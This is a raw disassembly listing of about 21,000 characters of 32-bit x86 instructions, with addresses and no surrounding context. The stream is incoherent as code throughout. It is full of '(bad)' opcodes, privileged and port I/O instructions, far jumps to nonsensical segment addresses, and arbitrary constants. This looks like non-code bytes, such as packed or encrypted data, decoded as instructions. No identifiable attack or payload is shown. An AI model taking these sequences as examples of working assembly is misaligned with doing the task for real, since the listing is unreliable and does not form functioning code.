  42e66c:	xlat   BYTE PTR ds:[ebx]
  42e66d:	sub    eax,0x32e783b8
  42e672:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e673:	aad    0x60
  42e675:	mov    ebx,0xb0aeb42d
  42e67a:	sub    esp,ebp
  42e67c:	clc    
  42e67d:	mov    ch,0x9c
  42e67f:	xor    eax,0xab63762e
  42e684:	mov    eax,ds:0xde1cdd25
  42e689:	mov    bh,0x85
  42e68b:	xchg   dx,ax
  42e68d:	ret    0xf946
  42e690:	lods   eax,DWORD PTR ds:[esi]
  42e691:	mov    edx,DWORD PTR [ebp+0x3f990003]
  42e697:	or     al,0xfc
  42e699:	push   ss
  42e69a:	jmp    0x42e61e
  42e69c:	pusha  
  42e69d:	jmp    0x42e63e
  42e69f:	loop   0x42e668
  42e6a1:	adc    eax,0x50a15d05
  42e6a6:	and    dl,bl
  42e6a8:	pusha  
  42e6a9:	jne    0x42e710
  42e6ab:	aam    0xc3
  42e6ad:	xchg   esi,eax
  42e6ae:	mov    ds:0x1182a255,al
  42e6b3:	fucomip st,st(0)
  42e6b5:	cmp    DWORD PTR [esi+0x6102a6a5],ecx
  42e6bb:	aas    
  42e6bc:	cmp    BYTE PTR [eax-0x1f],al
  42e6bf:	fimul  DWORD PTR [edx]
  42e6c1:	add    al,0x4b
  42e6c3:	pop    esp
  42e6c4:	xor    edx,0xc883b108
  42e6ca:	add    al,0xdc
  42e6cc:	fld    DWORD PTR [esi+0x6a]
  42e6cf:	test   DWORD PTR [esi],ecx
  42e6d1:	add    ebx,DWORD PTR [ebp-0x50]
  42e6d4:	jno    0x42e6c7
  42e6d6:	sbb    ecx,DWORD PTR es:[ecx-0x27]
  42e6da:	jecxz  0x42e74e
  42e6dc:	xchg   esp,eax
  42e6dd:	test   al,0x85
  42e6df:	or     eax,0x7dd61e4b
  42e6e4:	pop    esi
  42e6e5:	dec    ebx
  42e6e6:	retf   
  42e6e7:	aaa    
  42e6e8:	pop    esp
  42e6e9:	aas    
  42e6ea:	adc    cl,BYTE PTR [ecx+0x1d]
  42e6ed:	add    BYTE PTR [ecx+0x6a98389c],bl
  42e6f3:	fld    TBYTE PTR [esi+0x4b]
  42e6f6:	fwait
  42e6f7:	add    DWORD PTR [ecx+0x3a4771e1],ecx
  42e6fd:	sbb    eax,0xeb622d2a
  42e702:	or     dl,BYTE PTR [edx-0x59ae01e3]
  42e708:	pop    ebp
  42e709:	fcomp  DWORD PTR [edx-0x5600c556]
  42e70f:	or     edx,esp
  42e711:	inc    eax
  42e712:	(bad)  
  42e713:	push   edi
  42e714:	fistp  QWORD PTR [edx+0x48344175]
  42e71a:	(bad)
  42e71d:	dec    esp
  42e71e:	fld    QWORD PTR [eax]
  42e720:	std    
  42e721:	test   esi,edx
  42e723:	outs   dx,BYTE PTR ds:[esi]
  42e724:	jl     0x42e752
  42e726:	or     DWORD PTR [ebx+0x6f7957cb],ebp
  42e72c:	adc    DWORD PTR ds:0xe00badc4,esi
  42e732:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e733:	sub    BYTE PTR [ecx],bl
  42e735:	fnstenv ds:0xb1b6e26a
  42e73b:	rol    DWORD PTR [ebp+0x3b],1
  42e73e:	push   esi
  42e73f:	daa    
  42e740:	test   eax,0xc176ecf5
  42e746:	rol    dl,0xa9
  42e749:	fsubr  QWORD PTR [ecx+ecx*1]
  42e74c:	mov    BYTE PTR [edx-0x4a92703f],al
  42e752:	dec    ebp
  42e753:	(bad)
  42e756:	xlat   BYTE PTR ds:[ebx]
  42e757:	xor    dl,bh
  42e759:	mov    eax,0x4adb634
  42e75e:	sub    al,0x1a
  42e760:	and    eax,DWORD PTR [edi]
  42e762:	fld    QWORD PTR [edi+0x4507236e]
  42e768:	sbb    edx,DWORD PTR [edi]
  42e76a:	dec    ecx
  42e76b:	xchg   esp,eax
  42e76c:	pop    es
  42e76d:	leave  
  42e76e:	and    esp,DWORD PTR [ecx-0x4a]
  42e771:	mov    ch,0x6d
  42e773:	arpl   WORD PTR [ebp-0x68],sp
  42e776:	adc    eax,0x2f473ef6
  42e77b:	push   ebx
  42e77c:	inc    edx
  42e77d:	retf   
  42e77e:	outs   dx,BYTE PTR ds:[esi]
  42e77f:	pop    ebx
  42e780:	fcmovnb st,st(2)
  42e782:	scas   eax,DWORD PTR es:[edi]
  42e783:	hlt    
  42e784:	pop    esi
  42e785:	das    
  42e786:	lds    edx,FWORD PTR [ecx-0x71e849e9]
  42e78c:	test   al,0xba
  42e78e:	rcl    DWORD PTR [esi-0x3be7d3e],1
  42e794:	push   edx
  42e795:	cvttps2pi mm6,QWORD PTR [esp+eax*1]
  42e799:	ins    BYTE PTR es:[edi],dx
  42e79a:	rcl    DWORD PTR [edi],0xb4
  42e79d:	in     al,0x4f
  42e79f:	push   ss
  42e7a0:	cmp    ah,bh
  42e7a2:	mov    al,ds:0x80612dba
  42e7a7:	or     cl,al
  42e7a9:	leave  
  42e7aa:	(bad)  
  42e7ab:	lds    ecx,FWORD PTR [ebx+0x55]
  42e7ae:	fild   DWORD PTR [edx-0x3a]
  42e7b1:	loop   0x42e75f
  42e7b3:	push   cs
  42e7b4:	sub    eax,0xa09a0cf8
  42e7b9:	retf   
  42e7ba:	pop    ebx
  42e7bb:	add    DWORD PTR [esi],ebx
  42e7bd:	add    BYTE PTR [edx-0x45],bh
  42e7c0:	lea    eax,[esi]
  42e7c2:	mov    ecx,0x96170a97
  42e7c7:	mov    bl,0x6b
  42e7c9:	pop    eax
  42e7ca:	outs   dx,DWORD PTR ds:[esi]
  42e7cb:	push   cs
  42e7cc:	xchg   esp,eax
  42e7cd:	jecxz  0x42e7e1
  42e7cf:	arpl   WORD PTR [ebx+0x5b],cx
  42e7d2:	(bad)  
  42e7d3:	in     eax,0x0
  42e7d5:	out    dx,al
  42e7d6:	sub    BYTE PTR [esp],0x3a
  42e7da:	repnz push cs
  42e7dc:	mov    esi,edi
  42e7de:	sbb    ecx,DWORD PTR [ebx]
  42e7e0:	sbb    ecx,DWORD PTR [esi+eiz*4]
  42e7e3:	push   edx
  42e7e4:	jne    0x42e7a9
  42e7e6:	ret    
  42e7e7:	lds    eax,FWORD PTR [eax]
  42e7e9:	sub    DWORD PTR [eax+0x0],edx
  42e7ec:	dec    edx
  42e7ed:	jb     0x42e791
  42e7ef:	mov    al,0x29
  42e7f1:	pop    eax
  42e7f2:	call   0x1c86dd30
  42e7f7:	mov    cl,BYTE PTR [ebp-0x146027a8]
  42e7fd:	cmp    al,BYTE PTR [ecx+0x72c4730e]
  42e803:	mov    ds:0xc6785f03,eax
  42e808:	test   BYTE PTR [edx],bh
  42e80a:	cmp    edx,esi
  42e80c:	outs   dx,BYTE PTR ds:[esi]
  42e80d:	ins    BYTE PTR es:[edi],dx
  42e80e:	je     0x42e854
  42e810:	inc    ecx
  42e811:	xchg   DWORD PTR [esi+0x68196606],ebx
  42e817:	add    eax,0xed8889a3
  42e81c:	sti    
  42e81d:	xchg   esp,eax
  42e81e:	jge    0x42e811
  42e820:	out    0x4,eax
  42e822:	iret   
  42e823:	rcl    esi,0x54
  42e826:	je     0x42e7c4
  42e828:	sbb    eax,0xd6fec5d8
  42e82d:	pusha  
  42e82e:	inc    edi
  42e82f:	inc    esp
  42e830:	or     ebx,DWORD PTR [eax-0x7784f452]
  42e836:	add    bl,bl
  42e838:	mov    dh,0x1
  42e83a:	mov    BYTE PTR [ebx],bl
  42e83c:	les    edx,FWORD PTR [edi]
  42e83e:	retf   0x5686
  42e841:	ins    DWORD PTR es:[edi],dx
  42e842:	sub    edx,ecx
  42e844:	sbb    al,0xc6
  42e846:	add    DWORD PTR [edx],edi
  42e848:	adc    eax,edi
  42e84a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e84b:	sbb    cl,BYTE PTR [eax-0xc5a3eb3]
  42e851:	shl    BYTE PTR [edi-0x40],cl
  42e854:	inc    esi
  42e855:	xchg   esi,eax
  42e856:	ss ss inc esp
  42e859:	pop    ss
  42e85a:	dec    ecx
  42e85b:	jmp    0xc221:0xd605ac9f
  42e862:	mov    al,ds:0x95d8223a
  42e867:	pop    edi
  42e868:	sbb    bl,ch
  42e86a:	adc    DWORD PTR ds:0xee119f11,ebx
  42e870:	fimul  DWORD PTR ds:0x14074039
  42e876:	sbb    eax,DWORD PTR [ebx+0x38]
  42e879:	xor    bh,BYTE PTR [eax]
  42e87b:	adc    eax,0x665adb74
  42e880:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e881:	lods   al,BYTE PTR ds:[esi]
  42e882:	out    dx,eax
  42e883:	les    edx,FWORD PTR [edi]
  42e885:	mov    ch,0xed
  42e887:	xor    BYTE PTR [esi],0xa8
  42e88a:	or     eax,DWORD PTR [esp+ebp*1-0x18]
  42e88e:	jp     0x42e8e4
  42e890:	aaa    
  42e891:	ins    BYTE PTR es:[edi],dx
  42e892:	or     al,bl
  42e894:	adc    DWORD PTR [eax+esi*4-0x23ec8458],esp
  42e89b:	push   es
  42e89c:	push   ebp
  42e89d:	mov    ds:0xe6bfb228,al
  42e8a2:	gs pusha 
  42e8a4:	imul   esi,DWORD PTR [edi-0x4c4aefcb],0xffffffec
  42e8ab:	xchg   ebp,eax
  42e8ac:	lea    eax,[edi]
  42e8ae:	aam    0x85
  42e8b0:	inc    esi
  42e8b1:	or     dh,BYTE PTR [ebx-0x45]
  42e8b4:	fistp  WORD PTR [edx+0x6d]
  42e8b7:	mov    bh,0x9a
  42e8b9:	bound  eax,QWORD PTR [ecx]
  42e8bb:	in     al,0xe5
  42e8bd:	scas   eax,DWORD PTR es:[edi]
  42e8be:	lods   al,BYTE PTR ds:[esi]
  42e8bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e8c0:	(bad)  
  42e8c1:	es in  al,dx
  42e8c3:	je     0x42e866
  42e8c5:	aam    0xad
  42e8c7:	and    BYTE PTR [ebx+0x2530d544],dl
  42e8cd:	shl    al,1
  42e8cf:	fidiv  DWORD PTR [esi+0x50]
  42e8d2:	mov    cl,0xec
  42e8d4:	xor    al,0xc
  42e8d6:	adc    edx,esp
  42e8d8:	sbb    cl,BYTE PTR [edx-0x5e4a8248]
  42e8de:	pop    esp
  42e8df:	sbb    ch,0xf5
  42e8e2:	pop    es
  42e8e3:	loopne 0x42e930
  42e8e5:	(bad)  
  42e8e6:	ins    DWORD PTR es:[edi],dx
  42e8e7:	sub    ah,dl
  42e8e9:	(bad)  
  42e8ea:	dec    eax
  42e8eb:	or     BYTE PTR [ebx],cl
  42e8ed:	mov    bl,0x20
  42e8ef:	aas    
  42e8f0:	ficom  WORD PTR [edi-0x2b]
  42e8f3:	ins    DWORD PTR es:[edi],dx
  42e8f4:	mov    ds:0x447c9011,eax
  42e8f9:	xchg   esi,eax
  42e8fa:	outs   dx,BYTE PTR ds:[esi]
  42e8fb:	fcomp  QWORD PTR [edx-0x11a45278]
  42e901:	sbb    BYTE PTR [ecx+eax*4+0x4adaaaeb],0xb6
  42e909:	fstp   QWORD PTR [edx-0x28]
  42e90c:	ja     0x42e901
  42e90e:	mov    ds:0x5d403433,eax
  42e913:	fimul  DWORD PTR [ecx]
  42e915:	shl    DWORD PTR [edi-0x2f25f23a],1
  42e91b:	add    BYTE PTR [eax-0x61cfd420],0xec
  42e922:	aaa    
  42e923:	dec    ebx
  42e924:	sbb    ebx,DWORD PTR [ebp+0x45]
  42e927:	mov    esp,0xdd7f0942
  42e92c:	jb     0x42e8ff
  42e92e:	add    DWORD PTR [ebp+0x50],ebp
  42e931:	fimul  DWORD PTR [edx+0x1285e59a]
  42e937:	mov    al,0xb0
  42e939:	sbb    edi,DWORD PTR [edx+0x70]
  42e93c:	xlat   BYTE PTR ds:[ebx]
  42e93d:	fstp   DWORD PTR [ebx+0x6e]
  42e940:	ins    DWORD PTR es:[edi],dx
  42e941:	sub    DWORD PTR [esi-0x22e7f88],esi
  42e947:	ja     0x42e99c
  42e949:	adc    al,0xe6
  42e94b:	xor    DWORD PTR [ebx-0x3b],eax
  42e94e:	mov    es,WORD PTR [eax]
  42e950:	test   DWORD PTR fs:[ecx+0x15],eax
  42e954:	cs ins BYTE PTR es:[edi],dx
  42e956:	ins    DWORD PTR es:[edi],dx
  42e957:	ins    DWORD PTR es:[edi],dx
  42e958:	nop
  42e959:	sub    BYTE PTR [ecx],0xfb
  42e95c:	dec    edx
  42e95d:	xor    al,0xc
  42e95f:	jo     0x42e915
  42e961:	jmp    0xdfd3:0x22aec285
  42e968:	popf   
  42e969:	in     eax,0xd9
  42e96b:	mov    bl,BYTE PTR [eax-0x80]
  42e96e:	mov    dh,0xf
  42e970:	pop    ecx
  42e971:	stos   BYTE PTR es:[edi],al
  42e972:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e973:	jns    0x42e951
  42e975:	sahf   
  42e976:	and    ch,BYTE PTR [eax+0x2a]
  42e979:	cmp    al,BYTE PTR [ebx+ebx*2-0x20]
  42e97d:	jp     0x42e9dd
  42e97f:	cs ins BYTE PTR es:[edi],dx
  42e981:	jne    0x42e9c7
  42e983:	dec    edi
  42e984:	dec    edx
  42e985:	and    eax,0x5b1a304
  42e98a:	and    dh,BYTE PTR [esi+0x1]
  42e98d:	aas    
  42e98e:	xor    ebx,DWORD PTR [edx]
  42e990:	fmul   QWORD PTR [ebx+0x36]
  42e993:	push   ds
  42e994:	ret    0x85d3
  42e997:	sar    BYTE PTR es:[ebp+0x31],0x84
  42e99c:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e99e:	scas   al,BYTE PTR es:[edi]
  42e99f:	sub    BYTE PTR [edx-0x43035d73],ah
  42e9a5:	js     0x42e9a7
  42e9a7:	std    
  42e9a8:	dec    esi
  42e9a9:	clc    
  42e9aa:	xor    ebp,DWORD PTR ds:0x79ba374b
  42e9b0:	or     ah,cl
  42e9b2:	mov    dh,0xf5
  42e9b4:	push   esi
  42e9b5:	sub    eax,0x36801a01
  42e9ba:	push   ecx
  42e9bb:	outs   dx,DWORD PTR ds:[esi]
  42e9bc:	stos   BYTE PTR es:[edi],al
  42e9bd:	mov    ebp,0x745fd589
  42e9c2:	push   esp
  42e9c3:	or     ch,bl
  42e9c5:	fs adc edi,edi
  42e9c8:	aas    
  42e9c9:	aad    0x4
  42e9cb:	ror    DWORD PTR [edx-0x20],1
  42e9ce:	cli    
  42e9cf:	adc    BYTE PTR [edx-0x44ba4d18],ah
  42e9d5:	shr    ecx,0x84
  42e9d8:	inc    edi
  42e9d9:	xor    BYTE PTR [ecx+0x136a3e62],dl
  42e9df:	mov    ch,0x7d
  42e9e1:	sub    al,0x49
  42e9e3:	lahf   
  42e9e4:	aam    0xa9
  42e9e6:	jmp    0x42e9dd
  42e9e8:	cmp    esi,DWORD PTR ds:0x87083b00
  42e9ee:	xchg   esi,eax
  42e9ef:	nop
  42e9f0:	imul   eax,DWORD PTR [esi-0x46],0x11b0ba08
  42e9f7:	sahf   
  42e9f8:	mov    ebx,0x7c362a73
  42e9fd:	or     eax,0x7b376d04
  42ea02:	dec    esp
  42ea03:	push   ebp
  42ea04:	mov    al,0x79
  42ea06:	ins    BYTE PTR es:[edi],dx
  42ea07:	jl     0x42e9b3
  42ea09:	fucomp st(2)
  42ea0b:	mov    bh,BYTE PTR [ebx]
  42ea0d:	nop
  42ea0e:	push   edi
  42ea0f:	xchg   ecx,eax
  42ea10:	scas   eax,DWORD PTR es:[edi]
  42ea11:	cli    
  42ea12:	mov    dh,0x11
  42ea14:	ror    DWORD PTR [edi],0x36
  42ea17:	lahf   
  42ea18:	ret    0xea95
  42ea1b:	outs   dx,DWORD PTR ds:[esi]
  42ea1c:	clc    
  42ea1d:	mov    edx,0x4ef9d0b4
  42ea22:	sbb    DWORD PTR [esi-0x5],ebp
  42ea25:	inc    ecx
  42ea26:	jno    0x42ea01
  42ea28:	stos   BYTE PTR es:[edi],al
  42ea29:	(bad)  [eax+0x5b]
  42ea2c:	pop    edx
  42ea2d:	and    ah,BYTE PTR [ebx]
  42ea2f:	push   esi
  42ea30:	in     eax,0xd1
  42ea32:	jns    0x42ea16
  42ea34:	inc    BYTE PTR [edx-0x55f49fdd]
  42ea3a:	stos   BYTE PTR es:[edi],al
  42ea3b:	xchg   edi,eax
  42ea3c:	add    ebp,0xa37050db
  42ea42:	mov    eax,ds:0x58c1fb54
  42ea47:	data16 jg 0x42e9e2
  42ea4a:	fnstsw WORD PTR [edx-0x6af0b91e]
  42ea50:	dec    DWORD PTR [ebx+0x27]
  42ea53:	xchg   BYTE PTR [esi+ecx*4-0x5e8f493f],dh
  42ea5a:	out    dx,eax
  42ea5b:	mov    esi,0x508ed8bf
  42ea60:	xchg   BYTE PTR [ebp+0x13adb6b7],dh
  42ea66:	mov    ebp,0xff8510d
  42ea6b:	dec    edi
  42ea6c:	(bad)  [ebx]
  42ea6e:	or     ecx,DWORD PTR [ebp+0x41]
  42ea71:	dec    ebx
  42ea72:	push   esi
  42ea73:	lea    ebp,[edi]
  42ea75:	and    dl,BYTE PTR [esi]
  42ea77:	sub    edx,DWORD PTR [ebx+ebx*8+0x6e]
  42ea7b:	or     esi,DWORD PTR [ecx]
  42ea7d:	pop    ebp
  42ea7e:	cmp    ebx,DWORD PTR [edx-0x613fc148]
  42ea84:	mov    ah,0xb5
  42ea86:	mov    ds,WORD PTR [edx]
  42ea88:	jno    0x42ea7e
  42ea8a:	pop    ds
  42ea8b:	jp     0x42ea6a
  42ea8d:	xor    al,0x6d
  42ea8f:	or     esi,DWORD PTR [edi+0x4fce89cd]
  42ea95:	pop    ecx
  42ea96:	push   esi
  42ea97:	adc    BYTE PTR [bp+di+0x76e9],ah
  42ea9c:	stos   BYTE PTR es:[edi],al
  42ea9d:	lods   eax,DWORD PTR ds:[esi]
  42ea9e:	dec    ebp
  42ea9f:	add    al,al
  42eaa1:	push   ss
  42eaa2:	push   0x1b14fe46
  42eaa7:	mov    bh,0xba
  42eaa9:	mov    ecx,0x9b8f9a6b
  42eaae:	xchg   DWORD PTR [ebx-0x73],ebp
  42eab1:	push   es
  42eab2:	bound  eax,QWORD PTR [edi+0x79]
  42eab5:	daa    
  42eab6:	sub    al,bh
  42eab8:	pop    eax
  42eab9:	cmp    DWORD PTR [edi+edx*1-0x26],ebp
  42eabd:	(bad)  
  42eabe:	jno    0x42eae7
  42eac0:	ror    dl,0x1a
  42eac3:	cmp    eax,0x521d9668
  42eac8:	mov    eax,0x2e054db5
  42eacd:	cs cs mov eax,gs:0x1b6eba95
  42ead5:	inc    esp
  42ead6:	mov    cs:0x6bcc7b9,eax
  42eadc:	pop    ecx
  42eadd:	add    BYTE PTR [ebx-0x572e27de],bh
  42eae3:	mov    ebx,0xa8bb5dd3
  42eae8:	mov    dh,0x5d
  42eaea:	mov    al,ds:0x6eec7aa5
  42eaef:	sub    DWORD PTR [esi+0x1d],edx
  42eaf2:	rol    DWORD PTR ds:0x89176b71,1
  42eaf8:	cwde   
  42eaf9:	arpl   ax,ax
  42eafb:	and    BYTE PTR [ecx-0x50],al
  42eafe:	mov    eax,ds:0x916ff6ba
  42eb03:	outs   dx,BYTE PTR ds:[esi]
  42eb04:	push   ds
  42eb05:	add    DWORD PTR [eax],eax
  42eb07:	mov    eax,0x91da768a
  42eb0c:	and    BYTE PTR [esi],bh
  42eb0e:	imul   eax,DWORD PTR [eax+0x69],0xffffffbb
  42eb12:	test   al,0xca
  42eb14:	sbb    al,0x2f
  42eb16:	lods   al,BYTE PTR ds:[esi]
  42eb17:	push   cs
  42eb18:	lea    edi,[ebp+0x63]
  42eb1b:	sub    DWORD PTR [eax-0x62482e90],0x529f88e4
  42eb25:	imul   ecx,DWORD PTR [ebx],0xffffffd4
  42eb28:	pop    di
  42eb2a:	xchg   ebp,eax
  42eb2b:	jnp    0x42eb74
  42eb2d:	push   0x14
  42eb2f:	sub    eax,0xbfdac180
  42eb34:	rcl    DWORD PTR [esi+0x28],0x44
  42eb38:	jecxz  0x42eb34
  42eb3a:	cmp    BYTE PTR [edi-0x50dcff6f],al
  42eb40:	ins    BYTE PTR es:[edi],dx
  42eb41:	pop    ebp
  42eb42:	push   0x49b5c32d
  42eb47:	les    ebp,FWORD PTR [ecx]
  42eb49:	mov    dl,0xff
  42eb4b:	sbb    edx,DWORD PTR [ebp+0xd]
  42eb4e:	push   eax
  42eb4f:	sub    eax,0x14a60082
  42eb54:	outs   dx,BYTE PTR ds:[esi]
  42eb55:	or     eax,0x4dae1745
  42eb5a:	test   eax,0x6170376a
  42eb5f:	sub    eax,DWORD PTR [ecx]
  42eb61:	lods   eax,DWORD PTR ds:[esi]
  42eb62:	push   0x926219ec
  42eb67:	and    al,0xd6
  42eb6a:	push   ecx
  42eb6b:	mov    ds:0x4518aa1a,al
  42eb70:	fidiv  DWORD PTR [edx+0x178d6db1]
  42eb76:	jg     0x42ebaa
  42eb78:	cs stc 
  42eb7a:	aam    0xb1
  42eb7c:	xchg   ebp,eax
  42eb7d:	jge    0x42ebf3
  42eb7f:	arpl   bx,bx
  42eb81:	ds xor al,0x14
  42eb84:	adc    DWORD PTR es:[ebp-0x4c],0xdb71ed3a
  42eb8c:	mov    ds:0xdeb42d04,al
  42eb91:	xchg   edx,eax
  42eb92:	sbb    bl,ch
  42eb94:	loop   0x42ebdc
  42eb96:	pop    ebx
  42eb97:	push   ebx
  42eb98:	fadd   QWORD PTR [ecx+esi*2+0x30f05bd3]
  42eb9f:	ins    BYTE PTR es:[edi],dx
  42eba0:	fdiv   QWORD PTR [esi+0x35b6148e]
  42eba6:	add    ecx,DWORD PTR [eax]
  42eba8:	sbb    eax,0xb819e157
  42ebad:	mov    ch,0x4d
  42ebaf:	inc    esp
  42ebb0:	daa    
  42ebb1:	mov    cl,0x58
  42ebb3:	stos   BYTE PTR es:[edi],al
  42ebb4:	add    eax,0xdd012ad5
  42ebb9:	push   0xb78b340a
  42ebbe:	mov    dl,ch
  42ebc0:	mov    dh,0x1
  42ebc2:	outs   dx,BYTE PTR ds:[esi]
  42ebc3:	pop    ebp
  42ebc4:	pop    es
  42ebc5:	jecxz  0x42ec3b
  42ebc7:	mov    eax,0xd8c016ed
  42ebcc:	sti    
  42ebcd:	mov    gs,WORD PTR [edx]
  42ebcf:	xchg   esi,eax
  42ebd0:	stos   BYTE PTR es:[edi],al
  42ebd1:	add    edx,ebp
  42ebd3:	mov    bl,0xb6
  42ebd5:	adc    BYTE PTR [ebp-0xbd80580],dh
  42ebdb:	test   DWORD PTR [ebx],ecx
  42ebdd:	mov    ch,0xed
  42ebdf:	repnz lea ebx,[ecx-0x39ffe57b]
  42ebe6:	xchg   esi,eax
  42ebe7:	mov    dh,0x2
  42ebe9:	mov    eax,0xa3400d50
  42ebee:	mov    al,0xfb
  42ebf0:	cmp    BYTE PTR [ebx+0x367303df],0xba
  42ebf7:	test   al,0xad
  42ebf9:	cld    
  42ebfa:	cmp    eax,0x93d46089
  42ebff:	int    0xb6
  42ec01:	lea    ebp,[ebp-0x25]
  42ec04:	mov    eax,ds:0xad350e61
  42ec09:	dec    ebp
  42ec0a:	shl    BYTE PTR [edi+0x35],cl
  42ec0d:	sbb    BYTE PTR [ebx],ch
  42ec0f:	push   eax
  42ec10:	mov    ah,0x2a
  42ec12:	add    BYTE PTR [edi+0x4a],bh
  42ec15:	sub    BYTE PTR [ebp-0x4c879255],0x72
  42ec1c:	and    ecx,DWORD PTR ds:0x44d82d4d
  42ec22:	aaa    
  42ec23:	call   0xa8bd:0x3260dc2d
  42ec2a:	mov    cl,0x40
  42ec2c:	inc    esi
  42ec2d:	inc    edi
  42ec2e:	in     eax,dx
  42ec2f:	mov    ah,BYTE PTR [ecx-0x22363647]
  42ec35:	lahf   
  42ec36:	stos   BYTE PTR es:[edi],al
  42ec37:	dec    ebx
  42ec38:	pop    ebx
  42ec39:	fisttp DWORD PTR [eax]
  42ec3b:	pop    ss
  42ec3c:	es mov ch,0xc
  42ec3f:	jno    0x42eca7
  42ec41:	test   al,0xad
  42ec43:	ins    DWORD PTR es:[edi],dx
  42ec44:	xchg   edi,eax
  42ec45:	cmp    cl,BYTE PTR ds:0x8f1ecb25
  42ec4b:	mov    ecx,0x1a5cec64
  42ec50:	call   0xdc34c14b
  42ec55:	mov    ebp,0xb0480b98
  42ec5a:	jecxz  0x42ec42
  42ec5c:	push   edi
  42ec5d:	fst    QWORD PTR [esi-0x4c27c24a]
  42ec63:	mov    DWORD PTR [esi],edi
  42ec65:	jmp    0x42ec10
  42ec67:	cli    
  42ec68:	add    ch,ch
  42ec6a:	mov    BYTE PTR [esi+0x6f],0xab
  42ec6e:	xchg   edi,eax
  42ec6f:	jnp    0x42ecc4
  42ec71:	cmp    al,0xef
  42ec73:	dec    ebp
  42ec74:	shr    DWORD PTR [ebp-0x5d],1
  42ec77:	xchg   ecx,eax
  42ec78:	push   ds
  42ec79:	push   ecx
  42ec7a:	and    ebx,ecx
  42ec7c:	hlt    
  42ec7d:	and    BYTE PTR [esi-0x58],dl
  42ec80:	ret    0x4be5
  42ec83:	xlat   BYTE PTR ds:[ebx]
  42ec84:	inc    eax
  42ec85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ec86:	add    ah,ch
  42ec88:	pop    ss
  42ec89:	mov    gs:0xd8821b1a,eax
  42ec8f:	xor    esi,DWORD PTR [edx]
  42ec91:	iret   
  42ec92:	fst    QWORD PTR ds:0x37cb02db
  42ec98:	push   ss
  42ec99:	fcomip st,st(7)
  42ec9b:	seto   BYTE PTR [edi]
  42ec9e:	add    bh,bh
  42eca0:	ds aas 
  42eca2:	fcmovnb st,st(6)
  42eca4:	ret    0xd2c6
  42eca7:	adc    dl,BYTE PTR [eax]
  42eca9:	aaa    
  42ecaa:	push   ebp
  42ecab:	outs   dx,DWORD PTR ds:[esi]
  42ecac:	std    
  42ecad:	lods   eax,DWORD PTR ds:[esi]
  42ecae:	mov    ebp,edx
  42ecb0:	mov    al,ds:0x860d46e0
  42ecb5:	or     eax,0xb1b54229
  42ecba:	push   ebp
  42ecbb:	pusha  
  42ecbc:	aam    0x82
  42ecbe:	sahf   
  42ecbf:	aas    
  42ecc0:	add    al,0xb5
  42ecc2:	ins    DWORD PTR es:[edi],dx
  42ecc3:	xor    al,0x11
  42ecc5:	sti    
  42ecc6:	repz push ecx
  42ecc8:	push   esp
  42ecc9:	das    
  42ecca:	lea    ebp,[eax-0x4f925ea]
  42ecd0:	out    dx,al
  42ecd1:	and    ecx,DWORD PTR [edi-0x26]
  42ecd4:	mov    dh,0xb6
  42ecd6:	or     ebx,eax
  42ecd8:	mov    ebx,0xc25293bc
  42ecdd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ecde:	jge    0x42ecb2
  42ece0:	aam    0x40
  42ece2:	pop    ss
  42ece3:	push   ss
  42ece4:	mov    ds:0x2b0b9480,eax
  42ece9:	jmp    0x860e315f
  42ecee:	add    ch,BYTE PTR [edi]
  42ecf0:	cmp    eax,0xa0b8dce0
  42ecf5:	pop    es
  42ecf6:	mov    dh,0x1d
  42ecf8:	mov    bl,0x50
  42ecfa:	das    
  42ecfb:	push   cs
  42ecfc:	test   BYTE PTR [ebp+eiz*4-0x46],dl
  42ed00:	mov    ds:0x3561856e,al
  42ed05:	pop    edi
  42ed06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ed07:	pop    ebp
  42ed08:	mov    bh,0x80
  42ed0a:	lea    ebp,[ebp-0x25]
  42ed0d:	into   
  42ed0e:	sub    DWORD PTR [esi+0xf7e26f6],eax
  42ed14:	sbb    eax,0x5510b455
  42ed19:	mov    ebx,0x1b114978
  42ed1e:	add    dl,bl
  42ed20:	or     BYTE PTR [edi],al
  42ed22:	sbb    DWORD PTR [edx],0xffffff83
  42ed25:	inc    BYTE PTR [eax]
  42ed27:	xchg   esi,eax
  42ed28:	aaa    
  42ed29:	sbb    dh,BYTE PTR [edi+edx*2]
  42ed2c:	verw   WORD PTR [edi]
  42ed2f:	dec    esp
  42ed30:	in     eax,dx
  42ed31:	cmp    BYTE PTR [eax+0x28ffddd1],0x76
  42ed38:	iret   
  42ed39:	inc    ecx
  42ed3a:	xchg   edi,eax
  42ed3b:	in     eax,dx
  42ed3c:	sbb    al,0x1
  42ed3f:	mov    gs,WORD PTR ds:0x64bcb648
  42ed45:	shr    BYTE PTR ss:[ebp-0x5d],0x29
  42ed4a:	add    ebx,esp
  42ed4c:	mov    esp,0x72c4fc40
  42ed51:	or     al,0xb6
  42ed53:	pop    ebx
  42ed54:	mov    ebx,0xd3aa55b5
  42ed59:	jo     0x42ed20
  42ed5b:	ja     0x42ed8e
  42ed5d:	(bad)  
  42ed5e:	pop    edi
  42ed5f:	jbe    0x42edce
  42ed61:	sub    DWORD PTR [eax+0x22],0x3b
  42ed65:	push   ebx
  42ed66:	push   esp
  42ed67:	test   eax,0x856e8211
  42ed6c:	or     eax,DWORD PTR [ebx+esi*4]
  42ed6f:	dec    esp
  42ed70:	xchg   esp,eax
  42ed71:	xor    eax,0x6d0b080e
  42ed76:	or     ebp,DWORD PTR [eax-0x2e]
  42ed79:	retf   0x3f1e
  42ed7c:	inc    esp
  42ed7d:	or     eax,0xdc40165
  42ed82:	pop    es
  42ed83:	(bad)  
  42ed84:	pushf  
  42ed85:	fldcw  WORD PTR [edi-0x2924f47e]
  42ed8b:	imul   ecx,DWORD PTR [ecx],0xbacbf486
  42ed91:	and    BYTE PTR [ecx],0xbf
  42ed94:	outs   dx,BYTE PTR ds:[esi]
  42ed95:	ins    BYTE PTR es:[edi],dx
  42ed96:	(bad)  [ecx]
  42ed98:	pop    esi
  42ed99:	(bad)  
  42ed9b:	mov    bl,0x88
